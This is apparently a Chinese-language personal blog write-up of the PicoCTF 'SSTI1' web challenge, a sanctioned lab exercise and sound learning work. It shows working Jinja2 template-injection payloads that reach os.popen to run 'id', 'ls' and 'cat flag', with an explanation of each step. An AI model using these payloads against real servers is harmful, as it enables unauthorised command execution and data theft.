---
title: 'PicoCTF Web Exploitation 解題紀錄'
published: 2025-04-19
description: '紀錄一點web解題'
image: ''
tags: [PicoCTF, Web Exploitation, CTF, 網路安全]
category: '資安'
draft: false
lang: ''
---
# Introduction
這是拿來放一些解題ㄉ紀錄，慢慢邊做邊寫，因為我好久沒碰了



## SSTI1
### Description
首先你會看到一個酷酷的網站，有一個輸入框，你會發現不論輸入啥他都會顯示在頁面上，我們可以試試看輸入```{{7*7}}```  會得到什麼
<img src="https://i.imgur.com/mbFg62p.png" width="300" height="200" />
沒錯!一個大大的49，這就是一個SSTI的漏洞，這個漏洞可以讓我們執行python的程式碼，接下來我們可以試試看```{{7*7*7*7}}``` 會得到什麼
![image](https://i.imgur.com/WgLYlaS.png)
這時我們已經確定這是一個SSTI的漏洞了，接下來我們可以來點更有趣的東西，他可以執行python的程式碼，因此應該可以執行一些系統命令
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
![1745082641462](images/1745082641462.png)
這段程式碼大概的意思是
- ```request.application```: 訪問當前Web請求的應用

- ```__globals__```: 訪問全局命名空間，允許獲取內建函式

- ```__import__('os')```: 動態導入 os 模塊，這樣就可以使用操作系統相關功能

- ```popen('id')```: 執行系統命令 id，該命令顯示當前用戶的身份

- ```read()```: 讀取命令的輸出結果  
那我們可以把命令改成，ls來看看有沒有什麼驚喜，聽話讓我看看!
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
![1745083019268](images/1745083019268.png)
最後只要試試看
```
python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
我們就會得到flag了!  
picoCTF{||幹嘛，你要自己去試試看阿!還想偷看阿hhhhhhhhhhhhhhh||}  




